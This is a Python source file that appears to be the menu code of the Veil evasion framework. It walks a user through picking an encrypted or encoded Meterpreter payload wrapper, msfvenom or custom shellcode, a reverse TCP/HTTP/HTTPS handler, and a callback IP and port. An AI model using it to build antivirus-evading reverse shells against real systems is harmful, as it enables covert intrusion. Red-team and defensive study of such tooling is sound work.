# Import Modules
import socket
import sys
from modules.common import messages
from modules.payloads.c import cVoidPointer
from modules.payloads.c import cVirtualAlloc
from modules.payloads.python import pyAESVAlloc
from modules.payloads.python import pyARCVAlloc
from modules.payloads.python import pyb64VAlloc
from modules.payloads.python import pyDESVAlloc
from modules.payloads.python import pyLetterSubVAlloc
from modules.payloads.python import pyVirtualAlloc
from modules.payloads.python import pyvoidpointer

# PayloadChoice Options
PayloadChoice = {1 : pyvoidpointer.pyvoidpointer,
2 : pyVirtualAlloc.pyVirtualAlloc,
3 : pyb64VAlloc.pyb64VAlloc,
4 : pyLetterSubVAlloc.pyLetterSubVAlloc,
5 : pyARCVAlloc.pyARCVAlloc,
6 : pyDESVAlloc.pyDESVAlloc,
7 : pyAESVAlloc.pyAESVAlloc,
8 : cVoidPointer.cVoidPointer,
9 : cVirtualAlloc.cVirtualAlloc
}

# Set/Verify PayloadType Variable
def SetPayloadType():
    global PayloadType
    messages.title()
    print "\n[?] What payload type would you like to use?\n"
    print " 1 - Meterpreter - Python - void pointer"
    print " 2 - Meterpreter - Python - VirtualAlloc()"
    print " 3 - Meterpreter - Python - base64 Encoded"
    print " 4 - Meterpreter - Python - Letter Substitution"
    print " 5 - Meterpreter - Python - ARC4 Stream Cipher"
    print " 6 - Meterpreter - Python - DES Encrypted"
    print " 7 - Meterpreter - Python - AES Encrypted"
    print " 8 - Meterpreter - C - void pointer"
    print " 9 - Meterpreter - C - VirtualAlloc()"
    print " 0 - Exit Veil\n"

    # Retrieve PayloadType User Input
    try:
        PayloadType = raw_input("[>] Please enter the number of your choice: ")
    except KeyboardInterrupt:
        print "\n[!] Exiting...\n"
        sys.exit()

    # Exit Option
    if PayloadType == "0":
        exit()

    # Check if PayloadType is numeric.
    try:
        float(PayloadType)
    except ValueError:
        return SetPayloadType()

    # Check if PayloadType is a valid option.
    if  0 <= int(PayloadType) <= 9:
        return SetShellSrc()
    else:
        return SetPayloadType()

# Give the option for a custom shellcode.
def SetShellSrc():
    messages.title()
    global ShellSrc
    global CustomShell
    print '\n[?] Use msfvenom or supply custom shellcode?\n'
    print ' 1 - msfvenom (default)'
    print ' 2 - Custom\n'
    try:
        ShellSrc = raw_input("[>] Please enter the number of your choice: ")
    except KeyboardInterrupt:
        print "\n[!] Exiting...\n"
        sys.exit()

    # Check if ShellSrc is numeric.
    try:
        float(ShellSrc)
    except ValueError:
        return SetShellSrc()

    # Check if ShellSrc is a valid option.
    if not 1 <= int(ShellSrc) <= 2:
        return SetShellSrc()

    # Continue to msfvenom parameters.
    if ShellSrc == '2':
        try:
            CustomShell = raw_input("[>] Please enter custom shellcode (one line, no quotes): ")
            PayloadChoice[int(PayloadType)]()
        except KeyboardInterrupt:
            print "\n[!] Exiting...\n"
            sys.exit()
    else:
        return SetHandler()

# Set/Verify Handler Variable
def SetHandler():
    messages.title()
    global Handler
    print '\n[?] What type of payload would you like?\n'
    print ' 1 - Reverse TCP'
    print ' 2 - Reverse HTTP'
    print ' 3 - Reverse HTTPS'
    print ' 0 - Main Menu\n'

    # Retrieve Handler User Input
    try:
        Handler = raw_input("[>] Please enter the number of your choice: ")
    except KeyboardInterrupt:
        print "\n[!] Exiting...\n"
        sys.exit()

    # Check if Handler is numeric.
    try:
        float(Handler)
    except ValueError:
        messages.title()
        return SetHandler()

    # Check if Handler is a valid option.
    if Handler == "0":
        SetPayloadType()
    elif 0 <= int(Handler) <= 3:
        SetLocalHost()
    # Payload type validation check.
    else:
        messages.title()
        return SetHandler()

# Set/Verify LocalHost Variable
def SetLocalHost():
    global LocalHost

    # Retrieve LocalHost User Input
    try:
        LocalHost = raw_input("[?] What's the Local Host IP Address: ")
    except KeyboardInterrupt:
        print "\n[!] Exiting...\n"
        sys.exit()

    # Temporary Solution for Basic Verification (not perfect, fix later).
    try:
        socket.inet_aton(LocalHost)
        SetLocalPort()
    except socket.error:
        messages.title()
        print
        print "[Error]: Bad IP address specified.\n"
        return SetLocalHost()

# Set/Verify LocalPort Variable
def SetLocalPort():
    global LocalPort

    # Retrieve LocalPort User Input
    try:
        LocalPort = raw_input("[?] What's the Local Port Number: ")
    except KeyboardInterrupt:
        print "\n[!] Exiting...\n"
        sys.exit()

    # Check if LocalPort is numeric.
    try:
        float(LocalPort)
    except ValueError:
        messages.title()
        print
        print "[Error]: Bad port number specified.\n"
        return SetLocalPort()

    # Check if LocalPort is a valid port number.
    if 1 <= int(LocalPort) <= 65535:
        PayloadChoice[int(PayloadType)]()
    else:
        messages.title()
        print
        print "[Error]: Bad port number specified.\n"
        return SetLocalPort()
